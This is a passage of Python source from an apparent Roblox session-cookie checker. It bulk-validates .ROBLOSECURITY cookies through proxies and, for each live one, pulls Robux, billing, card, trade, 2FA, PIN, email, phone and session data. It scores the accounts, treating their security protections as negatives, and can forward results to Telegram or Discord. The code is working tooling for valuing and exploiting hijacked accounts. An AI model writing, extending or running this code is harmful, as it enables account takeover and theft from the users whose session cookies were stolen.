                isTradePrivacy = data['tradePrivacy']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Trade Privacy:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}No{ANSI.CLEAR}' if isTradePrivacy == 'AllUsers' else f'{ANSI.FG.RED}Yes{ANSI.CLEAR}'} | ', f'Trade Privacy: {'No' if isTradePrivacy == 'AllUsers' else 'Yes'} | ', 'No' if isTradePrivacy == 'AllUsers' else 'Yes'
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isCanTradeFunc(isAccountInformation, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Can_Trade'] and not isControlPanel:
        return '', '', ''
    isCanTrade = isAccountInformation['CanTrade']
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Can Trade:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}Yes' if isCanTrade else f'{ANSI.FG.RED}No'}{ANSI.CLEAR} | ', f'Can Trade: {'Yes' if isCanTrade else 'No'} | ', 'Yes' if isCanTrade else 'No'

async def isSessionsFunc(session: ClientSession, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Sessions'] and not isControlPanel:
        return '', '', ''
    isSessions = 0
    nextPageCursorSessions = ''
    pageCurrentCount = 0
    while nextPageCursorSessions != None and pageCurrentCount != config['Roblox']['CookieChecker']['Main']['Sessions_Max_Check_Pages']:
        try:
            async with session.get(f'https://apis.roblox.com/token-metadata-service/v1/sessions?nextCursor={nextPageCursorSessions}', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isSessions += len(data['sessions'])
                nextPageCursorSessions = data['nextCursor']
                pageCurrentCount += 1
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Sessions:{ANSI.CLEAR} {f'{ANSI.FG.RED}{isSessions}' if isSessions >= 10 else f'{ANSI.FG.YELLOW}{isSessions}' if isSessions >= 5 else f'{ANSI.FG.GREEN}{isSessions}'}{ANSI.CLEAR} | ', f'Sessions: {isSessions} | ', isSessions

async def isEmailFunc(isAccountInformation, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Email'] and not isControlPanel:
        return '', '', ''
    isEmailSetted = isAccountInformation['MyAccountSecurityModel']['IsEmailSet']
    isEmailVerified = isAccountInformation['MyAccountSecurityModel']['IsEmailVerified']
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Email:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}No' if not isEmailSetted else f'{ANSI.FG.RED}Yes' if isEmailSetted and isEmailVerified else f'{ANSI.FG.YELLOW}Setted'}{ANSI.CLEAR} | ', f'Email: {'No' if not isEmailSetted else 'Yes' if isEmailSetted and isEmailVerified else 'Setted'} | ', 'No' if not isEmailSetted else 'Yes' if isEmailSetted and isEmailVerified else 'Setted'

async def isPhoneFunc(session: ClientSession, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Phone'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get('https://accountinformation.roblox.com/v1/phone', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isPhone = data['phone']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Phone:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}No' if isPhone == None else f'{ANSI.FG.RED}Yes'}{ANSI.CLEAR} | ', f'Phone: {'No' if isPhone == None else 'Yes'} | ', 'No' if isPhone == None else 'Yes'
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def is2FAFunc(isAccountInformation, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['2FA'] and not isControlPanel:
        return '', '', ''
    is2FA = isAccountInformation['MyAccountSecurityModel']['IsTwoStepEnabled']
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}2FA:{ANSI.CLEAR} {f'{ANSI.FG.RED}Yes' if is2FA else f'{ANSI.FG.GREEN}No'}{ANSI.CLEAR} | ', f'2FA: {'Yes' if is2FA else 'No'} | ', 'Yes' if is2FA else 'No'

async def isPinFunc(isAccountInformation, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Pin'] and not isControlPanel:
        return '', '', ''
    isPin = isAccountInformation['IsAccountPinEnabled']
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Pin:{ANSI.CLEAR} {f'{ANSI.FG.RED}Yes' if isPin else f'{ANSI.FG.GREEN}No'}{ANSI.CLEAR} | ', f'Pin: {'Yes' if isPin else 'No'} | ', 'Yes' if isPin else 'No'

async def isAbove13Func(isAccountInformation, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Above_13'] and not isControlPanel:
        return '', '', ''
    isAbove13 = isAccountInformation['UserAbove13']
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}>13:{ANSI.CLEAR} {'Yes' if isAbove13 else 'No'} | ', f'>13: {'Yes' if isAbove13 else 'No'} | ', 'Yes' if isAbove13 else 'No'

async def isVerifiedAgeFunc(session: ClientSession, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Verified_Age'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get('https://apis.roblox.com/age-verification-service/v1/age-verification/verified-age', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isVerifiedAge = data['isVerified']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Verified Age:{ANSI.CLEAR} {'Yes' if isVerifiedAge else 'No'} | ', f'Verified Age: {'Yes' if isVerifiedAge else 'No'} | ', 'Yes' if isVerifiedAge else 'No'
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isVoiceFunc(session: ClientSession, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Voice'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get('https://voice.roblox.com/v1/settings', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isVoice = data['isVerifiedForVoice']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Voice:{ANSI.CLEAR} {'Yes' if isVoice else 'No'} | ', f'Voice: {'Yes' if isVoice else 'No'} | ', 'Yes' if isVoice else 'No'
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isNumberOfFriendsFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Friends'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get(f'https://friends.roblox.com/v1/users/{isID}/friends/count', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isNumberOfFriends = data['count']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Friends:{ANSI.CLEAR} {isNumberOfFriends} | ', f'Friends: {isNumberOfFriends} | ', isNumberOfFriends
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isNumberOfFollowersFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Followers'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get(f'https://friends.roblox.com/v1/users/{isID}/followers/count', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isNumberOfFollowers = data['count']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Followers:{ANSI.CLEAR} {isNumberOfFollowers} | ', f'Followers: {isNumberOfFollowers} | ', isNumberOfFollowers
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isNumberOfFollowingsFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Followings'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get(f'https://friends.roblox.com/v1/users/{isID}/followings/count', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isNumberOfFollowings = data['count']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Followings:{ANSI.CLEAR} {isNumberOfFollowings} | ', f'Followings: {isNumberOfFollowings} | ', isNumberOfFollowings
        except (KeyError, TypeError, ContentTypeError, ):
            await asyncio.sleep(1)

async def isRobloxBadgesFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Roblox_Badges'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get(f'https://accountinformation.roblox.com/v1/users/{isID}/roblox-badges', timeout=3, ssl=ssl) as response:
                robloxBadges = await response.json()
                isRobloxBadges = [robloxBadge['name'] for robloxBadge in robloxBadges]
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Roblox Badges:{ANSI.CLEAR} {', '.join(isRobloxBadges) if isRobloxBadges else 'No'} | ', f'Roblox Badges: {', '.join(isRobloxBadges) if isRobloxBadges else 'No'} | ', isRobloxBadges
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isXCSRFTokenFunc(session: ClientSession, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['X_CSRF_Token'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.post('https://auth.roblox.com/v2/logout', timeout=3, ssl=ssl) as response:
                isXCSRFToken = response.headers['X-CSRF-Token']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}X-CSRF-Token:{ANSI.CLEAR} {isXCSRFToken} | ', f'X-CSRF-Token: {isXCSRFToken} | ', isXCSRFToken
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

def getGlobalCheckListGamepasses():
    global checkListGamepasses; checkListGamepasses = []
    for place in listOfPlaces:
        if config['Roblox']['CookieChecker']['Places'][place.placeNames[1]] and getattr(place, 'Gamepasses', False):
            for gamepass in place.Gamepasses.listOfGamepasses:
                if config['Roblox']['CookieChecker'][place.__name__][gamepass[2]]:
                    checkListGamepasses.append(gamepass[1])
    for customPlace in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']:
        if config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][0] and f'{customPlace}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces']:
            for gamepass in config['Roblox']['CookieChecker']['CustomPlaces'][f'{customPlace}_Gamepasses']:
                if gamepass[2]:
                    checkListGamepasses.append(gamepass[0])

def getGlobalCheckListBadges():
    global checkListBadges; checkListBadges = []
    for place in listOfPlaces:
        if config['Roblox']['CookieChecker']['Places'][place.placeNames[1]] and getattr(place, 'Badges', False):
            for badge in place.Badges.listOfBadges:
                if config['Roblox']['CookieChecker'][place.__name__][badge[2]]:
                    checkListBadges.append(badge[1])
    for customPlace in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']:
        if config['Roblox']['CookieChecker']['CustomPlaces'][str(customPlace)][0] and f'{customPlace}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces']:
            for badge in config['Roblox']['CookieChecker']['CustomPlaces'][f'{customPlace}_Badges']:
                if badge[2]:
                    checkListBadges.append(badge[0])

def getGlobalCheckListCustomGamepasses(): global checkListCustomGamepasses; checkListCustomGamepasses = [customGamepass[0]                       for customGamepass in config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_List'] if customGamepass[1]]
def getGlobalCheckListFavoritePlaces():   global checkListFavoritePlaces;   checkListFavoritePlaces   = {str(favoritePlace[0]): favoritePlace[1] for favoritePlace  in config['Roblox']['CookieChecker']['Main']['Favorite_Places_List']   if favoritePlace[2]}
def getGlobalCheckListBundles():          global checkListBundles;          checkListBundles          = [bundle[0]                               for bundle         in config['Roblox']['CookieChecker']['Main']['Bundles_List']           if bundle[2]]

async def isResponseStatusFromCookie(cookieRoblox: dict, headersRoblox: dict = None, proxies: list = None, ssl=False) -> int:
    while True:
        try:
            session = ClientSession(connector=await robloxGetConnector('CookieChecker', proxies), cookies=cookieRoblox, headers=headersRoblox)
            response = await session.get(f'https://users.roblox.com/v1/users/authenticated', timeout=3, ssl=ssl)
            if response.status == 429:
                await asyncio.sleep(int(response.headers.get('x-ratelimit-reset', 10)))
                continue
            await session.close()
            return response.status
        except (ContentTypeError):
            await asyncio.sleep(0.5)
        except (ClientOSError, ConnectionTimeoutError, ClientConnectorError, ServerDisconnectedError, ProxyConnectionError, ProxyTimeoutError, TimeoutError):
            pass
        finally:
            await session.close()

async def isResponseDataFromCookie(cookieRoblox: dict | None, headersRoblox: dict = None, proxies: list = None, ssl=False, isControlPanel: bool = False):
    if not config['Roblox']['CookieChecker']['General']['First_Check_All_Cookies_For_Valid']:
        responseStatus = await isResponseStatusFromCookie(cookieRoblox, headersRoblox, proxies, ssl)
        if responseStatus != 200:
            return responseStatus, None, None
    else:
        responseStatus = 200

    session = ClientSession(connector=await robloxGetConnector('CookieChecker', proxies), cookies=cookieRoblox, headers=headersRoblox)

    while True:
        try:
            responseAccountInformation = await session.get(f'https://www.roblox.com/my/settings/json', timeout=3, ssl=ssl)
            isAccountInformation = await responseAccountInformation.json()
            isID = isAccountInformation['UserId']
            break
        except ContentTypeError:
            await asyncio.sleep(1)
        except (ClientOSError, ConnectionTimeoutError, ClientConnectorError, ServerDisconnectedError, ProxyConnectionError, ProxyTimeoutError, TimeoutError):
            await session.close()
            session = ClientSession(connector=await robloxGetConnector('CookieChecker', proxies), cookies=cookieRoblox, headers=headersRoblox)

    while True:
        try:
            responseAllData = await asyncio.gather(*(
                isLinkFunc(                        isID,                            isControlPanel),
                isCountryRegistrationFunc(session,                             ssl, isControlPanel),
                isNameFunc(                              isAccountInformation,      isControlPanel),
                isDisplayNameFunc(                       isAccountInformation,      isControlPanel),
                isRegistrationDateFunc(   session, isID, isAccountInformation, ssl, isControlPanel),
                isRobuxFunc(              session, isID,                       ssl, isControlPanel),
                isBillingFunc(            session,                             ssl, isControlPanel),
                isTransactionsForYearFunc(session, isID,                       ssl, isControlPanel),
                isDonateAllTimeFunc(      session, isID,                       ssl, isControlPanel),
                isRapFunc(                session, isID,                       ssl, isControlPanel),
                isCardFunc(               session,                             ssl, isControlPanel),
                isPremiumFunc(                           isAccountInformation,      isControlPanel),
                isGamepassesFunc(         session, isID,                       ssl, isControlPanel),
                isBadgesFunc(             session, isID,                       ssl, isControlPanel),
                isFavoritePlacesFunc(     session, isID,                       ssl, isControlPanel),
                isBundlesFunc(            session, isID,                       ssl, isControlPanel),
                isInventoryPrivacyFunc(   session,                             ssl, isControlPanel),
                isTradePrivacyFunc(       session,                             ssl, isControlPanel),
                isCanTradeFunc(                          isAccountInformation,      isControlPanel),
                isSessionsFunc(           session,                             ssl, isControlPanel),
                isEmailFunc(                             isAccountInformation,      isControlPanel),
                isPhoneFunc(              session,                             ssl, isControlPanel),
                is2FAFunc(                               isAccountInformation,      isControlPanel),
                isPinFunc(                               isAccountInformation,      isControlPanel),
                isAbove13Func(                           isAccountInformation,      isControlPanel),
                isVerifiedAgeFunc(        session,                             ssl, isControlPanel),
                isVoiceFunc(              session,                             ssl, isControlPanel),
                isNumberOfFriendsFunc(    session, isID,                       ssl, isControlPanel),
                isNumberOfFollowersFunc(  session, isID,                       ssl, isControlPanel),
                isNumberOfFollowingsFunc( session, isID,                       ssl, isControlPanel),
                isRobloxBadgesFunc(       session, isID,                       ssl, isControlPanel),
                isXCSRFTokenFunc(         session,                             ssl, isControlPanel)
            ))
            await session.close()
            return responseStatus, isID, responseAllData
        except (ClientOSError, ConnectionTimeoutError, ClientConnectorError, ServerDisconnectedError, ProxyConnectionError, ProxyTimeoutError, TimeoutError):
            await session.close()
            session = ClientSession(connector=await robloxGetConnector('CookieChecker', proxies), cookies=cookieRoblox, headers=headersRoblox)

async def robloxCookieValidChecker(category: str, cookies, proxies=None, ssl=False, locker=asyncio.Lock()) -> list:
    validCookies = []
    if config['Roblox'][category]['General']['First_Check_All_Cookies_For_Valid']:
        totalWord = ''.join(MT_Total).lower().capitalize()
        validCount = invalidCount = 0
        amountOfCookiesFromFile = len(cookies)
        sys.stdout.write(f'\n {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_First_We_Check_For_Valid}: {ANSI.FG.GREEN}{MT_Valid}{ANSI.CLEAR + ANSI.DECOR.BOLD}: 0, {ANSI.FG.RED}{MT_Invalid}{ANSI.CLEAR + ANSI.DECOR.BOLD}: 0 | {ANSI.FG.CYAN}{totalWord}{ANSI.CLEAR + ANSI.DECOR.BOLD}: 0 {MT_Of} {amountOfCookiesFromFile}{ANSI.CLEAR}')

        semaphore = asyncio.Semaphore(config['Roblox'][category]['General']['Number_Of_Threads_For_Valid_Checker'] if str(config['Roblox'][category]['General']['Number_Of_Threads_For_Valid_Checker']).isdigit() and (0 < int(config['Roblox'][category]['General']['Number_Of_Threads_For_Valid_Checker']) <= 500) else 5)

        async def threadingCheckValid(cookie: str, proxies: list):
            nonlocal validCount, invalidCount
            async with semaphore:
                cookie = cookie.strip()
                headersRoblox = None # {'User-Agent': ua.random}
                cookieRoblox = {'.ROBLOSECURITY': cookie}

                isResponseStatus = await isResponseStatusFromCookie(cookieRoblox, headersRoblox, proxies, ssl)

                async with locker:
                    if isResponseStatus == 200:
                        validCookies.append(cookie)
                        validCount += 1
                    else:
                        invalidCount += 1

                    sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_First_We_Check_For_Valid}: {ANSI.FG.GREEN}{MT_Valid}{ANSI.CLEAR + ANSI.DECOR.BOLD}: {validCount}, {ANSI.FG.RED}{MT_Invalid}{ANSI.CLEAR + ANSI.DECOR.BOLD}: {invalidCount} | {ANSI.FG.CYAN}{totalWord}{ANSI.CLEAR + ANSI.DECOR.BOLD}: {validCount + invalidCount} {MT_Of} {amountOfCookiesFromFile}{ANSI.CLEAR}')
                    sys.stdout.flush()

        validCheckTasks = [threadingCheckValid(cookie, proxies if config['Roblox'][category]['Proxy']['Use_Proxy'] else None) for cookie in cookies]
        await asyncio.gather(*validCheckTasks)
        
        if not validCookies:
            return await errorOrCorrectHandler(True, 4, MT_All_Cookies_Were_Invalid, f'{MT_Roblox}\\{MT_Cookie_Checker if category == 'CookieChecker' else MT_Transaction_Analysis}')
        
        await removeLines(1)
        return validCookies
    else:
        return list({cookie for cookie in cookies})

async def robloxCookieChecker(file: str):
    await cls()
    await lableASCII()

    if not [data[1] for data in cookieData.listOfCookieData
            if config['Roblox']['CookieChecker']['Main'][data[1]]]:
        return await errorOrCorrectHandler(True, 0, MT_Enable_Something_To_Start_Checking, f'{MT_Roblox}\\{MT_Cookie_Checker}')

    sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Checker}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Wait[0]}...')

    proxiesFromFile = await getProxiesFromFile(config['Roblox']['CookieChecker']['Proxy']['Use_Proxy'], f'Roblox\\Cookie Checker\\proxies.txt', f'{MT_Roblox}\\{MT_Cookie_Checker}', 2)
    if config['Roblox']['CookieChecker']['Proxy']['Use_Proxy'] and not proxiesFromFile:
        return

    cookiesFromFile = await getCookiesFromFile(f'Roblox\\Cookie Checker\\{file}.txt', f'{MT_Roblox}\\{MT_Cookie_Checker}', 2)
    if not cookiesFromFile:
        return

    useSSL = True if config['Roblox']['CookieChecker']['General']['Use_SSL'] else False

    sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Start_Checking_File} \'{ANSI.DECOR.UNDERLINE1}{file}.txt{ANSI.CLEAR + ANSI.DECOR.BOLD}\':\n')

    checkReadyRobloxCookies = await robloxCookieValidChecker('CookieChecker', cookiesFromFile, proxiesFromFile, useSSL)
    if not checkReadyRobloxCookies:
        return

    if config['Roblox']['CookieChecker']['General']['Output_Total'] or (config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] or config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']):
        totalData_CURRENT = {
            'Robux'             : 0,
            'Billing'           : 0,
            'Pending'           : 0,
            'Donate (1 Year)'   : 0,
            'Donate (All Time)' : 0,
            'Rap'               : 0,
            'Premium'           : 0,
            'Card'              : 0,
            'Gamepasses'        : 0,
            'Custom Gamepasses' : 0,
            'Badges'            : 0,
            'Favorite Places'   : 0,
            'Bundles'           : 0
        }

        for key in totalData_CURRENT:
            if not config['Roblox']['CookieChecker']['Main']['_'.join(key.replace('(', '').replace(')', '').split())]:
                totalData_CURRENT[key] = f'{ANSI.FG.GRAY}Off{ANSI.CLEAR}'

        async def totalOutputRCC():
            labelsTotalOutputRCC = [
                rf'   {ANSI.FG.GRAY}______________________________',
                rf'  {ANSI.FG.GRAY}/  | {ANSI.CLEAR +                                             ANSI.FG.LIGHTCYAN}Cookie:{           ANSI.CLEAR} {cookieCount} {MT_Of} {amountOfCookiesFromFile}',
                rf' {ANSI.FG.GRAY}/   | {ANSI.CLEAR +                                             ANSI.FG.LIGHTCYAN}Valid:{            ANSI.CLEAR} {validCount}',
                rf' {ANSI.FG.GRAY}|   | {ANSI.CLEAR +                                             ANSI.FG.LIGHTCYAN}Robux:{            ANSI.CLEAR} {totalData_CURRENT['Robux']}',
                rf' {ANSI.FG.GRAY}|   | {ANSI.CLEAR +                                             ANSI.FG.LIGHTCYAN}Billing:{          ANSI.CLEAR} {totalData_CURRENT['Billing']}',
                rf' {ANSI.FG.GRAY}|   | {ANSI.CLEAR +                                             ANSI.FG.LIGHTCYAN}Pending:{          ANSI.CLEAR} {totalData_CURRENT['Pending']}',
                rf' {ANSI.FG.GRAY}| {ANSI.FG.PINK   + MT_Total[0] + ANSI.FG.GRAY} | {ANSI.CLEAR + ANSI.FG.LIGHTCYAN}Donate (1 Year):{  ANSI.CLEAR} {totalData_CURRENT['Donate (1 Year)']}',
                rf' {ANSI.FG.GRAY}| {ANSI.FG.PINK   + MT_Total[1] + ANSI.FG.GRAY} | {ANSI.CLEAR + ANSI.FG.LIGHTCYAN}Donate (All Time):{ANSI.CLEAR} {totalData_CURRENT['Donate (All Time)']}',
                rf' {ANSI.FG.GRAY}| {ANSI.FG.PINK   + MT_Total[2] + ANSI.FG.GRAY} | {ANSI.CLEAR + ANSI.FG.LIGHTCYAN}Rap:{              ANSI.CLEAR} {totalData_CURRENT['Rap']}',
                rf' {ANSI.FG.GRAY}| {ANSI.FG.PINK   + MT_Total[3] + ANSI.FG.GRAY} | {ANSI.CLEAR + ANSI.FG.LIGHTCYAN}Premium:{          ANSI.CLEAR} {totalData_CURRENT['Premium']}',
                rf' {ANSI.FG.GRAY}| {ANSI.FG.PINK   + MT_Total[4] + ANSI.FG.GRAY} | {ANSI.CLEAR + ANSI.FG.LIGHTCYAN}Card:{             ANSI.CLEAR} {totalData_CURRENT['Card']}',
                rf' {ANSI.FG.GRAY}|   | {ANSI.CLEAR +                                             ANSI.FG.LIGHTCYAN}Gamepasses:{       ANSI.CLEAR} {totalData_CURRENT['Gamepasses']}',
                rf' {ANSI.FG.GRAY}|   | {ANSI.CLEAR +                                             ANSI.FG.LIGHTCYAN}Custom Gamepasses:{ANSI.CLEAR} {totalData_CURRENT['Custom Gamepasses']}',
                rf' {ANSI.FG.GRAY}|   | {ANSI.CLEAR +                                             ANSI.FG.LIGHTCYAN}Badges:{           ANSI.CLEAR} {totalData_CURRENT['Badges']}',
                rf' {ANSI.FG.GRAY}\   | {ANSI.CLEAR +                                             ANSI.FG.LIGHTCYAN}Favorite Places:{  ANSI.CLEAR} {totalData_CURRENT['Favorite Places']}',
                rf'  {ANSI.FG.GRAY}\  | {ANSI.CLEAR +                                             ANSI.FG.LIGHTCYAN}Bundles:{          ANSI.CLEAR} {totalData_CURRENT['Bundles']}',
                rf'   {ANSI.FG.GRAY}‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾{ANSI.CLEAR}'
            ]

            for label in labelsTotalOutputRCC:
                sys.stdout.write(f'{label}\n')
            sys.stdout.flush()

    if config['Roblox']['CookieChecker']['Main']['Gamepasses']:        getGlobalCheckListGamepasses()
    if config['Roblox']['CookieChecker']['Main']['Badges']:            getGlobalCheckListBadges()
    if config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses']: getGlobalCheckListCustomGamepasses()
    if config['Roblox']['CookieChecker']['Main']['Favorite_Places']:   getGlobalCheckListFavoritePlaces()
    if config['Roblox']['CookieChecker']['Main']['Bundles']:           getGlobalCheckListBundles()

    if config['Roblox']['CookieChecker']['Sorting']['Sort']:
        sortListCategories = {}
        categories = getCookieDataForSort()
        await removeIncorrectSortValues(categories[1])
        for category in categories[0]:
            if categories[0][category] == int and config['Roblox']['CookieChecker']['Sorting'][category][0] or categories[0][category] == str and config['Roblox']['CookieChecker']['Sorting'][category]:
                sortListCategories[category] = categories[0][category]

    if config['Roblox']['CookieChecker']['General']['Name_Output_File_The_Same_As_Input_File']:
        fileName = file
    elif not any(char in config['Roblox']['CookieChecker']['General']['Output_Filename'] for char in ['\\', '/', ':', '*', '?', '"', '<', '>', '|']) and len(config['Roblox']['CookieChecker']['General']['Output_Filename']) <= 50:
        fileName = config['Roblox']['CookieChecker']['General']['Output_Filename']
    else:
        fileName = 'output'

    cookieCount = 0
    validCount = 0
    amountOfCookiesFromFile = len(checkReadyRobloxCookies)
    dateOfCheck = datetime.now().strftime('%d.%m.%Y - %H.%M.%S')
    semaphore = asyncio.Semaphore(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker'] if str(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker']).isdigit() and (0 < int(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker']) <= 500) else 10)
    locker = asyncio.Lock()

    # Основной чекер
    async def threadingCheckData(cookie: str, proxies: list | None = None):
        nonlocal cookieCount, validCount
        async with semaphore:
            headersRoblox = None # {'User-Agent': ua.random}
            cookieRoblox = {'.ROBLOSECURITY': cookie}

            responseStatus, isID, resultsRCC = await isResponseDataFromCookie(cookieRoblox, headersRoblox, proxies, useSSL)

            if responseStatus == 200:
                # Вывод данных
                isAccountLink,             isAccountLinkN                                                                                            = resultsRCC[0]
                isCountryRegistration,     isCountryRegistrationN,                             isCountryRegistrationSorting                          = resultsRCC[1]
                isName,                    isNameN,                   isNameClean                                                                    = resultsRCC[2]
                isDisplayName,             isDisplayNameN,            isDisplayNameClean                                                             = resultsRCC[3]
                isRegistrationDate,        isRegistrationDateN,       isRegistrationDateClean                                                        = resultsRCC[4][0], resultsRCC[4][1], resultsRCC[4][2]
                isRegistrationDateInDaysSorting                                                                                                      = resultsRCC[4][5]
                isRobux,                   isRobuxN,                                                                                    isRobuxTimed = resultsRCC[5]
                isBilling,                 isBillingN,                                                                                isBillingTimed = resultsRCC[6]
                isTransactionsForYear, isTransactionsForYearN, isPendingTimed, isDonate1YearTimed                                                    = resultsRCC[7]
                isDonateAllTime, isDonateAllTimeN, isDonateAllTimeTimed, isCustomGamepasses, isCustomGamepassesN, isCustomGamepassesTimed            = resultsRCC[8]
                isRap,                     isRapN,                                                                                        isRapTimed = resultsRCC[9]
                isCard,                    isCardN,                                                                                      isCardTimed = resultsRCC[10]
                isPremium,                 isPremiumN,                                         isPremiumSorting,                      isPremiumTimed = resultsRCC[11]
                isGamepasses,              isGamepassesN,                                                                          isGamepassesTimed = resultsRCC[12]
                isBadges,                  isBadgesN,                                                                                  isBadgesTimed = resultsRCC[13]
                isFavoritePlaces,          isFavoritePlacesN,                                                                  isFavoritePlacesTimed = resultsRCC[14]
                isBundles,                 isBundlesN,                                                                                isBundlesTimed = resultsRCC[15]
                isInventoryPrivacy,        isInventoryPrivacyN,       isInventoryPrivacyClean                                                        = resultsRCC[16]
                isTradePrivacy,            isTradePrivacyN,           isTradePrivacyClean                                                            = resultsRCC[17]
                isCanTrade,                isCanTradeN,               isCanTradeClean                                                                = resultsRCC[18]
                isSessions,                isSessionsN,                                        isSessionsSorting                                     = resultsRCC[19]
                isEmail,                   isEmailN,                                           isEmailSorting                                        = resultsRCC[20]
                isPhone,                   isPhoneN,                                           isPhoneSorting                                        = resultsRCC[21]
                is2FA,                     is2FAN,                                             is2FASorting                                          = resultsRCC[22]
                isPin,                     isPinN,                                             isPinSorting                                          = resultsRCC[23]
                isAbove13,                 isAbove13N,                                         isAbove13Sorting                                      = resultsRCC[24]
                isVerifiedAge,             isVerifiedAgeN,                                     isVerifiedAgeSorting                                  = resultsRCC[25]
                isVoice,                   isVoiceN,                                           isVoiceSorting                                        = resultsRCC[26]
                isNumberOfFriends,         isNumberOfFriendsN,                                 isNumberOfFriendsSorting                              = resultsRCC[27]
                isNumberOfFollowers,       isNumberOfFollowersN,                               isNumberOfFollowersSorting                            = resultsRCC[28]
                isNumberOfFollowings,      isNumberOfFollowingsN,                              isNumberOfFollowingsSorting                           = resultsRCC[29]
                isRobloxBadges,            isRobloxBadgesN,           isRobloxBadgesClean                                                            = resultsRCC[30]
                isXCSRFToken,              isXCSRFTokenN,             isXCSRFTokenClean                                                              = resultsRCC[31]
                # Всё, что сверху, переменные для вывода, в планах поменять их просто на resultRCC[index][index]

                # Данные общего вывода
                if config['Roblox']['CookieChecker']['General']['Output_Total'] or (config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] or config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']):
                    totalData_UPDATE = {
                        'Robux'             : isRobuxTimed,
                        'Billing'           : isBillingTimed,
